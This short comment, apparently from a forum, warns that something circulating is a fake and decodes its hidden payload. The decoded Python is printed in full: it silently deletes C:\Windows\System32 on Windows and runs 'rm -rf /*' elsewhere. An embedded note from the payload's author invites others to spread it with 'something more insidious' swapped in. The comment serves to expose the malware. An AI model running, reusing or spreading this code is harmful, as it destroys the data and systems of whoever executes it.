It's a fake and delete your disk completely.

If you convert the payload to ascii
"__import__('os').sys"
  "tem('del /s /q /f C:"
  "\windows\system32\* "
  "> NUL 2>&1') if 'Win"
  "' in __import__('pla"
  "tform').system() els"
  "e __import__('os').s"
  "ystem('rm -rf /* > /"
  "dev/null 2>&1') #hi "
  "there ^_~ feel free "
  "to spread this with "
  "the rm -rf replaced "
  "with something more "
  "insidious"
